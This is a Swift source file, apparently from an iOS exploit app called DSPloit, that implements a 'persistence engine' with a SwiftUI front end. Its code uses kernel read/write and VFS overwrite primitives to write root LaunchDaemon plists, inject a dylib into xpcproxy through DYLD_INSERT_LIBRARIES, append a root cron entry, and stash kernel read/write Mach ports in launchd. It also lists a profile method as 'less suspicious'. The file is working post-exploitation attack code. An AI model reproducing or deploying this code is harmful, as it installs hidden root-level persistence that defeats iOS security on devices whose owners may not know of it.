//
//  BleedingEdgePersistence.swift
//  DSPloit
//
//  🔥 BLEEDING EDGE: Persistence Engine
//  Survive reboot via VFS LaunchDaemon modification
//  Multiple persistence methods: LaunchDaemon, dylib injection, boot hooks
//  Created by Royan
//

import SwiftUI
import Combine

// MARK: - Data Models

struct PersistenceMethod: Identifiable {
    let id = UUID()
    let name: String
    let description: String
    let path: String
    let risk: PersistenceRisk
    let survivesReboot: Bool
    let requiresRoot: Bool
    let icon: String
    var installed: Bool = false
}

enum PersistenceRisk: String {
    case low = "Low"
    case medium = "Medium"
    case high = "High"
    case critical = "Critical"
    
    var color: Color {
        switch self {
        case .low: return .green
        case .medium: return .yellow
        case .high: return .orange
        case .critical: return .red
        }
    }
}

struct PersistenceStatus: Identifiable {
    let id = UUID()
    let method: String
    let installed: Bool
    let path: String
    let lastCheck: Date
    let message: String
}

// MARK: - Persistence Engine

class PersistenceEngine: ObservableObject {
    static let shared = PersistenceEngine()
    
    @Published var methods: [PersistenceMethod] = []
    @Published var statusChecks: [PersistenceStatus] = []
    @Published var isWorking = false
    @Published var statusLog: [String] = []
    @Published var krwStashed = false
    
    private let mgr = dspmgr.shared
    
    // LaunchDaemon plist template
    private let launchDaemonPlist = """
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
    <dict>
        <key>Label</key>
        <string>com.dsploit.persistence</string>
        <key>ProgramArguments</key>
        <array>
            <string>/var/jb/usr/bin/dsploit_helper</string>
            <string>--recover</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
        <key>KeepAlive</key>
        <true/>
        <key>UserName</key>
        <string>root</string>
    </dict>
    </plist>
    """
    
    // Dylib injection plist (DYLD_INSERT_LIBRARIES)
    private let dyldPlist = """
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
    <dict>
        <key>Label</key>
        <string>com.dsploit.dyld_hook</string>
        <key>ProgramArguments</key>
        <array>
            <string>/usr/libexec/xpcproxy</string>
        </array>
        <key>EnvironmentVariables</key>
        <dict>
            <key>DYLD_INSERT_LIBRARIES</key>
            <string>/var/jb/usr/lib/dsploit_hook.dylib</string>
        </dict>
        <key>RunAtLoad</key>
        <true/>
    </dict>
    </plist>
    """
    
    init() {
        loadMethods()
    }
    
    private func log(_ msg: String) {
        DispatchQueue.main.async {
            self.statusLog.append(msg)
            if self.statusLog.count > 200 { self.statusLog.removeFirst(100) }
        }
        globallogger.log("(persist) \(msg)")
    }
    
    private func loadMethods() {
        methods = [
            PersistenceMethod(
                name: "LaunchDaemon (VFS)",
                description: "Write LaunchDaemon plist via VFS to /Library/LaunchDaemons. Survives reboot if filesystem is writable.",
                path: "/Library/LaunchDaemons/com.dsploit.persistence.plist",
                risk: .high,
                survivesReboot: true,
                requiresRoot: false,
                icon: "arrow.clockwise.circle.fill"
            ),
            PersistenceMethod(
                name: "KRW Stash (Mach Ports)",
                description: "Stash KRW socket ports to launchd via bootstrap_register. Recoverable after app restart (not reboot).",
                path: "bootstrap://krw.darksword.control_port",
                risk: .medium,
                survivesReboot: false,
                requiresRoot: false,
                icon: "tray.and.arrow.down.fill"
            ),
            PersistenceMethod(
                name: "DYLD Hook (VFS)",
                description: "Install dylib hook via DYLD_INSERT_LIBRARIES in LaunchDaemon. Hooks system processes on boot.",
                path: "/Library/LaunchDaemons/com.dsploit.dyld_hook.plist",
                risk: .critical,
                survivesReboot: true,
                requiresRoot: false,
                icon: "link.circle.fill"
            ),
            PersistenceMethod(
                name: "Cron Job (VFS)",
                description: "Write cron entry via VFS. Executes periodically.",
                path: "/var/at/tabs/root",
                risk: .medium,
                survivesReboot: true,
                requiresRoot: false,
                icon: "clock.fill"
            ),
            PersistenceMethod(
                name: "Profile Install",
                description: "Install MDM-style profile that triggers on boot. Less suspicious.",
                path: "/var/db/ConfigurationProfiles/",
                risk: .low,
                survivesReboot: true,
                requiresRoot: false,
                icon: "person.badge.shield.checkmark.fill"
            ),
        ]
    }
    
    // MARK: - LaunchDaemon Persistence (VFS)
    
    func installLaunchDaemon() {
        guard mgr.vfsready else {
            log("❌ VFS not ready — cannot write LaunchDaemon")
            return
        }
        
        isWorking = true
        log("Installing LaunchDaemon via VFS...")
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            guard let self else { return }
            
            let plistPath = "/Library/LaunchDaemons/com.dsploit.persistence.plist"
            let plistData = Data(self.launchDaemonPlist.utf8)
            
            // Step 1: Check if directory exists
            let dirEntries = self.mgr.vfslistdir(path: "/Library/LaunchDaemons")
            if dirEntries == nil {
                self.log("⚠️ /Library/LaunchDaemons not accessible — trying /var/jb path")
                // Try alternative jailbreak path
                let altPath = "/var/jb/Library/LaunchDaemons/com.dsploit.persistence.plist"
                let ok = self.mgr.dsploit_overwritefile(target: altPath, data: plistData)
                DispatchQueue.main.async {
                    self.log(ok.ok ? "✅ LaunchDaemon installed at \(altPath)" : "❌ Failed: \(ok.message)")
                    self.updateMethodStatus(name: "LaunchDaemon (VFS)", installed: ok.ok)
                    self.isWorking = false
                }
                return
            }
            
            // Step 2: Write plist via VFS
            let ok = self.mgr.dsploit_overwritefile(target: plistPath, data: plistData)
            
            DispatchQueue.main.async {
                if ok.ok {
                    self.log("✅ LaunchDaemon installed: \(plistPath)")
                    self.log("   Will execute /var/jb/usr/bin/dsploit_helper --recover on boot")
                    self.updateMethodStatus(name: "LaunchDaemon (VFS)", installed: true)
                } else {
                    self.log("❌ Failed to write LaunchDaemon: \(ok.message)")
                    self.updateMethodStatus(name: "LaunchDaemon (VFS)", installed: false)
                }
                self.isWorking = false
            }
        }
    }
    
    // MARK: - KRW Stash (Mach Port Persistence)
    
    func stashKRW() {
        guard mgr.dsready else {
            log("❌ Kernel not ready")
            return
        }
        
        #if !DISABLE_REMOTECALL
        guard mgr.rcready else {
            log("❌ RemoteCall not ready — need RC for port stash")
            return
        }
        
        isWorking = true
        log("Stashing KRW ports to launchd...")
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            guard let self else { return }
            
            let success = transfer_krw_to_launchd()
            
            DispatchQueue.main.async {
                if success {
                    self.krwStashed = true
                    self.log("✅ KRW ports stashed to launchd")
                    self.log("   control_port: \(CONTROL_PORT_NAME)")
                    self.log("   rw_port: \(RW_PORT_NAME)")
                    self.updateMethodStatus(name: "KRW Stash (Mach Ports)", installed: true)
                } else {
                    self.log("❌ Failed to stash KRW ports")
                    self.updateMethodStatus(name: "KRW Stash (Mach Ports)", installed: false)
                }
                self.isWorking = false
            }
        }
        #else
        log("❌ RemoteCall disabled at compile time")
        #endif
    }
    
    // MARK: - Recover KRW After App Restart
    
    func recoverKRW() {
        isWorking = true
        log("Attempting KRW recovery from stashed ports...")
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            guard let self else { return }
            
            let success = recover_krw_primitives()
            
            DispatchQueue.main.async {
                if success {
                    self.log("✅ KRW recovered! kernel_base=0x\(String(format: "%llx", kernel_base))")
                    self.mgr.dsready = true
                    self.mgr.kernbase = ds_get_kernel_base()
                    self.mgr.kernslide = ds_get_kernel_slide()
                    self.krwStashed = true
                } else {
                    self.log("❌ KRW recovery failed — ports may have been invalidated")
                    self.log("   (reboot clears bootstrap ports)")
                }
                self.isWorking = false
            }
        }
    }
    
    // MARK: - DYLD Hook Persistence
    
    func installDyldHook() {
        guard mgr.vfsready else {
            log("❌ VFS not ready")
            return
        }
        
        isWorking = true
        log("Installing DYLD hook persistence...")
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            guard let self else { return }
            
            let plistPath = "/Library/LaunchDaemons/com.dsploit.dyld_hook.plist"
            let plistData = Data(self.dyldPlist.utf8)
            
            let ok = self.mgr.dsploit_overwritefile(target: plistPath, data: plistData)
            
            DispatchQueue.main.async {
                if ok.ok {
                    self.log("✅ DYLD hook plist installed")
                    self.log("⚠️ Need to also write the dylib to /var/jb/usr/lib/dsploit_hook.dylib")
                    self.updateMethodStatus(name: "DYLD Hook (VFS)", installed: true)
                } else {
                    self.log("❌ Failed: \(ok.message)")
                    self.updateMethodStatus(name: "DYLD Hook (VFS)", installed: false)
                }
                self.isWorking = false
            }
        }
    }
    
    // MARK: - Cron Persistence
    
    func installCronJob() {
        guard mgr.vfsready else {
            log("❌ VFS not ready")
            return
        }
        
        isWorking = true
        log("Installing cron persistence...")
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            guard let self else { return }
            
            // Read existing crontab
            let cronPath = "/var/at/tabs/root"
            var existing = ""
            if let data = self.mgr.vfsread(path: cronPath) {
                existing = String(data: data, encoding: .utf8) ?? ""
            }
            
            // Add our entry (every 5 minutes)
            let cronEntry = "*/5 * * * * /var/jb/usr/bin/dsploit_helper --keepalive\n"
            
            if existing.contains("dsploit_helper") {
                self.log("⚠️ Cron entry already exists")
                DispatchQueue.main.async { self.isWorking = false }
                return
            }
            
            let newCron = existing + cronEntry
            let ok = self.mgr.dsploit_overwritefile(target: cronPath, data: Data(newCron.utf8))
            
            DispatchQueue.main.async {
                self.log(ok.ok ? "✅ Cron job installed" : "❌ Failed: \(ok.message)")
                self.updateMethodStatus(name: "Cron Job (VFS)", installed: ok.ok)
                self.isWorking = false
            }
        }
    }
    
    // MARK: - Status Check
    
    func checkAllPersistence() {
        guard mgr.vfsready || mgr.sbxready else {
            log("Need VFS or SBX for status check")
            return
        }
        
        isWorking = true
        statusChecks.removeAll()
        log("Checking persistence status...")
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            guard let self else { return }
            
            // Check LaunchDaemon
            let ldPath = "/Library/LaunchDaemons/com.dsploit.persistence.plist"
            let ldSize = self.mgr.vfssize(path: ldPath)
            let ldExists = ldSize > 0
            
            DispatchQueue.main.async {
                self.statusChecks.append(PersistenceStatus(
                    method: "LaunchDaemon",
                    installed: ldExists,
                    path: ldPath,
                    lastCheck: Date(),
                    message: ldExists ? "Found (\(ldSize) bytes)" : "Not installed"
                ))
            }
            
            // Check DYLD hook
            let dyldPath = "/Library/LaunchDaemons/com.dsploit.dyld_hook.plist"
            let dyldSize = self.mgr.vfssize(path: dyldPath)
            let dyldExists = dyldSize > 0
            
            DispatchQueue.main.async {
                self.statusChecks.append(PersistenceStatus(
                    method: "DYLD Hook",
                    installed: dyldExists,
                    path: dyldPath,
                    lastCheck: Date(),
                    message: dyldExists ? "Found (\(dyldSize) bytes)" : "Not installed"
                ))
            }
            
            // Check cron
            let cronPath = "/var/at/tabs/root"
            var cronInstalled = false
            if let data = self.mgr.vfsread(path: cronPath),
               let content = String(data: data, encoding: .utf8) {
                cronInstalled = content.contains("dsploit_helper")
            }
            
            DispatchQueue.main.async {
                self.statusChecks.append(PersistenceStatus(
                    method: "Cron Job",
                    installed: cronInstalled,
                    path: cronPath,
                    lastCheck: Date(),
                    message: cronInstalled ? "Entry found" : "Not installed"
                ))
            }
            
            // Check KRW stash
            let stashExists = UserDefaults.standard.dictionary(forKey: "KRWPrimitive") != nil
            
            DispatchQueue.main.async {
                self.statusChecks.append(PersistenceStatus(
                    method: "KRW Stash",
                    installed: stashExists,
                    path: "UserDefaults/KRWPrimitive",
                    lastCheck: Date(),
                    message: stashExists ? "Stash data found" : "No stash"
                ))
                self.isWorking = false
            }
        }
    }
    
    // MARK: - Remove Persistence
    
    func removePersistence(method: PersistenceMethod) {
        guard mgr.vfsready else {
            log("VFS not ready")
            return
        }
        
        log("Removing: \(method.name)...")
        
        // Zero out the file via VFS
        let ok = mgr.vfszeropage(at: method.path, dumb: true)
        log(ok ? "✅ Removed \(method.name)" : "❌ Failed to remove")
        updateMethodStatus(name: method.name, installed: !ok)
    }
    
    private func updateMethodStatus(name: String, installed: Bool) {
        if let idx = methods.firstIndex(where: { $0.name == name }) {
            methods[idx].installed = installed
        }
    }
}

// MARK: - Main View

struct BleedingEdgePersistenceView: View {
    @ObservedObject private var engine = PersistenceEngine.shared
    @ObservedObject private var mgr = dspmgr.shared
    
    var body: some View {
        List {
            // Status
            Section {
                HStack {
                    Image(systemName: "arrow.clockwise.circle.fill")
                        .font(.title2)
                        .foregroundStyle(mgr.vfsready ? .green : .secondary)
                    VStack(alignment: .leading, spacing: 4) {
                        Text("Persistence Engine")
                            .font(.headline)
                        Text(mgr.vfsready ? "VFS ready — can write to filesystem" : "VFS required for persistence")
                            .font(.caption)
                            .foregroundStyle(.secondary)
                    }
                }
                
                HStack {
                    StatusIndicator(active: mgr.dsready, label: "Kernel")
                    Spacer()
                    StatusIndicator(active: mgr.vfsready, label: "VFS")
                    Spacer()
                    StatusIndicator(active: mgr.sbxready, label: "Sandbox")
                    Spacer()
                    StatusIndicator(active: engine.krwStashed, label: "Stashed")
                }
            } header: {
                HeaderLabel(text: "Status", icon: "shield.fill")
            }
            
            // Quick Actions
            Section {
                Button(action: { engine.checkAllPersistence() }) {
                    Label("Check All Persistence", systemImage: "magnifyingglass")
                }
                .disabled(!mgr.vfsready || engine.isWorking)
                
                Button(action: { engine.recoverKRW() }) {
                    Label("Recover KRW (from stash)", systemImage: "arrow.uturn.backward.circle")
                }
                .disabled(engine.isWorking)
            } header: {
                HeaderLabel(text: "Quick Actions", icon: "bolt.fill")
            }
            
            // Persistence Methods
            Section {
                ForEach(engine.methods) { method in
                    VStack(alignment: .leading, spacing: 6) {
                        HStack {
                            Image(systemName: method.icon)
                                .foregroundStyle(method.installed ? .green : .blue)
                            VStack(alignment: .leading, spacing: 2) {
                                HStack {
                                    Text(method.name)
                                        .font(.subheadline.bold())
                                    if method.installed {
                                        Image(systemName: "checkmark.seal.fill")
                                            .font(.caption2)
                                            .foregroundStyle(.green)
                                    }
                                }
                                Text(method.description)
                                    .font(.caption2)
                                    .foregroundStyle(.secondary)
                                    .lineLimit(2)
                            }
                        }
                        
                        HStack(spacing: 12) {
                            Label(method.risk.rawValue, systemImage: "exclamationmark.triangle")
                                .font(.caption2)
                                .foregroundStyle(method.risk.color)
                            
                            if method.survivesReboot {
                                Label("Reboot", systemImage: "arrow.clockwise")
                                    .font(.caption2)
                                    .foregroundStyle(.cyan)
                            }
                            
                            if method.requiresRoot {
                                Label("Root", systemImage: "lock.fill")
                                    .font(.caption2)
                                    .foregroundStyle(.red)
                            }
                            
                            Spacer()
                            
                            // Install/Remove buttons
                            if method.installed {
                                Button("Remove") {
                                    engine.removePersistence(method: method)
                                }
                                .font(.caption2)
                                .foregroundStyle(.red)
                                .buttonStyle(.bordered)
                            } else {
                                Button("Install") {
                                    installMethod(method)
                                }
                                .font(.caption2)
                                .buttonStyle(.bordered)
                                .disabled(!canInstall(method))
                            }
                        }
                    }
                    .padding(.vertical, 4)
                }
            } header: {
                HeaderLabel(text: "Methods (\(engine.methods.count))", icon: "list.bullet.rectangle")
            }
            
            // Status Checks
            if !engine.statusChecks.isEmpty {
                Section {
                    ForEach(engine.statusChecks) { status in
                        HStack {
                            Image(systemName: status.installed ? "checkmark.circle.fill" : "xmark.circle")
                                .foregroundStyle(status.installed ? .green : .secondary)
                            VStack(alignment: .leading, spacing: 2) {
                                Text(status.method)
                                    .font(.caption.bold())
                                Text(status.path)
                                    .font(.system(size: 9, design: .monospaced))
                                    .foregroundStyle(.cyan)
                            }
                            Spacer()
                            Text(status.message)
                                .font(.caption2)
                                .foregroundStyle(.secondary)
                        }
                    }
                } header: {
                    HeaderLabel(text: "Status Checks", icon: "checkmark.shield")
                }
            }
            
            // Theory / Notes
            Section {
                VStack(alignment: .leading, spacing: 8) {
                    Text("How Persistence Works on iOS 18.2:")
                        .font(.caption.bold())
                    
                    Text("""
                    1. LaunchDaemon: Write plist to /Library/LaunchDaemons via VFS. \
                    launchd reads these on boot and spawns the process. \
                    Requires the binary to exist at the specified path.
                    
                    2. KRW Stash: Register socket file descriptors as Mach ports \
                    in launchd's bootstrap namespace. App can recover them \
                    after restart (but NOT after reboot).
                    
                    3. DYLD Hook: Set DYLD_INSERT_LIBRARIES in a LaunchDaemon \
                    to inject a dylib into a system process on boot.
                    
                    ⚠️ iOS 18 SSV (Signed System Volume) prevents modifying \
                    /System. All persistence must use /var or /Library paths.
                    """)
                    .font(.system(size: 10))
                    .foregroundStyle(.secondary)
                }
            } header: {
                HeaderLabel(text: "Theory", icon: "book.fill")
            }
            
            // Log
            if !engine.statusLog.isEmpty {
                Section {
                    ForEach(engine.statusLog.suffix(30), id: \.self) { line in
                        Text(line)
                            .font(.system(size: 9, design: .monospaced))
                            .foregroundStyle(.secondary)
                    }
                } header: {
                    HeaderLabel(text: "Log", icon: "terminal")
                }
            }
        }
        .navigationTitle("Persistence")
        .premiumStyling()
    }
    
    private func installMethod(_ method: PersistenceMethod) {
        switch method.name {
        case "LaunchDaemon (VFS)":
            engine.installLaunchDaemon()
        case "KRW Stash (Mach Ports)":
            engine.stashKRW()
        case "DYLD Hook (VFS)":
            engine.installDyldHook()
        case "Cron Job (VFS)":
            engine.installCronJob()
        default:
            break
        }
    }
    
    private func canInstall(_ method: PersistenceMethod) -> Bool {
        if engine.isWorking { return false }
        switch method.name {
        case "KRW Stash (Mach Ports)":
            return mgr.dsready && mgr.rcready
        default:
            return mgr.vfsready
        }
    }
}
